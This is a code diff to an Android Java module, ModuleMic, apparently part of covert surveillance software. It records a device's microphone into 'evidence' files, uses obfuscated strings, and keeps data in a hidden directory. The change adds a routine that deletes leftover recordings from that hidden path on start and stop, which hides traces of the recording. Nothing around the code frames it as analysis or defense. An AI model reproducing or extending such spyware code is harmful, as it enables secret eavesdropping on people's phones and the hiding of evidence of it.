@@ -30,6 +30,7 @@ import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.listener.ListenerProcess;
@@ -40,6 +41,8 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.mm.M;
 
+import java.io.File;
+import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.HashSet;
 import java.util.List;
@@ -63,6 +66,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	protected boolean recorder_started=false;
 	protected int numFailures;
 	protected long fId;
+	protected static final String MIC_SUFFIX = M.e(".a"); //$NON-NLS-1$
 	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 
 	/**
@@ -79,6 +83,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	public ModuleMic() {
 		super();
 		resetBlacklist();
+		cleanLeftoverEvidence();
 		pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
 
 	}
@@ -152,6 +157,26 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		return true;
 	}
 
+	void cleanLeftoverEvidence() {
+		File fList = new File(Path.hidden() + M.e("/"));
+		File[] files = fList.listFiles(new FilenameFilter() {
+			public boolean accept(File dir, String filename) {
+				return filename.endsWith(MIC_SUFFIX);
+			}
+		});
+		for (File f : files) {
+			if (f.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cleanLeftoverEvidence) deleting : " + f.getName());
+				}
+				if (!f.delete()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cleanLeftoverEvidence) failure deleting : " + f.getName());
+					}
+				}
+			}
+		}
+	}
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -164,7 +189,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			if (Cfg.DEBUG) {
 				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
-
+			cleanLeftoverEvidence();
 			if (standbyObserver == null) {
 				standbyObserver = new StandByObserver(this);
 			}
@@ -227,6 +252,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		ListenerStandby.self().detach(standbyObserver);
 		standbyObserver=null;
 		specificStop();
+		cleanLeftoverEvidence();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (ended)");//$NON-NLS-1$
 		}
